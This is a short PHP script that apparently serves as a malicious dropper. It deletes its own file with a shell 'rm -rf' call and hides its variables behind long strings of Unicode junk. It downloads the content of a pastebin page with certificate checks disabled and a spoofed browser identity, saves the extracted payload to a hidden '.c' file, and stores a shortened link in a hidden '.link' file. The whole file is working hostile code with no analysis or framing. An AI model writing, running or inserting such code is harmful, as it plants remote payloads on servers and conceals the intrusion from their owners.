<?php
system('rm -rf hid.php');
function abc($url)
{	$ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺=curl_init();curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_URL,'https://pastebin.com/kqmiCkJV');curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36");curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_RETURNTRANSFER,1);curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_HEADER, $show_header);curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLINFO_HEADER_OUT,true);curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_COOKIEFILE,"cookie.txt");curl_setopt($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺,CURLOPT_COOKIEJAR,"cookie.txt");	$result=curl_exec($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺);	$info=curl_getinfo($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌쪺);return $result;}
$ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌墕=explode('<textarea id="paste_code" class="paste_code" name="paste_code" onkeydown="return catchTab(this,event)">',abc($url));
$ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌𗺴=explode('</textarea>', $ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌墕[1]);
$ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌𭴻=".c";
file_put_contents($ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌𭴻,$ᕃ𐦯鬡𤑤ࡪ쯦ﺷڿ𗶲𞡲𐿴罫ﱤ𑀊ܟ𡇏軸ܨ𞠅좝ﴞﳂ𞡷𢖩𫻲𐢆𗛙𥩄𒍆폄𮌆抢𦟸𐪂ﱜﰩ𭣸𫦘𡶄𠳁𡅑𤕷𗣋ﻘپށ𠇃ﯟ䤌𗺴[0]);
$link = '.link';
file_put_contents($link,'https://semawur.com/0BqtgG3');
?>

